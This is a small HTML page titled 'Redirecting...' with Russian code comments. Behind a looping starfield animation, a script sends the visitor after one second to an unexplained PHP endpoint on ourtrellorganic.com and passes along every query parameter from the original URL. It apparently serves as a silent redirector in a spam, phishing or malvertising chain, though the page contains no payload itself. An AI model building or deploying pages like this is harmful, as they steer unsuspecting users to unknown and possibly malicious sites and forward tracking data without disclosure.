<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>
<style>
    body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background-color: black;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .cosmic-animation {
        border: 0;
        display: block;
        background: radial-gradient(circle, rgba(255,255,255,0.2) 20%, transparent 20%), 
                    radial-gradient(circle, rgba(255,255,255,0.15) 20%, transparent 20%) black;
        background-position: 0 0, 50px 50px;
        width: 100%;
        height: 100%;
        background-size: 100px 100px;
        animation: move 2s linear infinite;
    }
    @keyframes move {
        from {background-position: 0 0, 50px 50px;}
        to {background-position: 100px 100px, 150px 150px;}
    }
</style>
</head>
<body>

<div class="cosmic-animation"></div>

<script type="text/javascript">
    // Функция для получения параметров из URL
    function getQueryParams() {
        var params = {};
        window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(str, key, value) {
            params[key] = value;
        });
        return params;
    }

    // Функция для создания строки параметров
    function buildQueryString(params) {
        return Object.keys(params).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(params[key])).join('&');
    }

    // Перенаправление на целевой URL с параметрами
    setTimeout(function() {
        var targetUrl = 'https://ourtrellorganic.com/cby6l0k.php';
        var queryParams = getQueryParams();
        var queryString = buildQueryString(queryParams);
        window.location.href = targetUrl + '?' + queryString;
    }, 1000); // Задержка редиректа на 1000 мс (1 секунда)
</script>

</body>
</html>



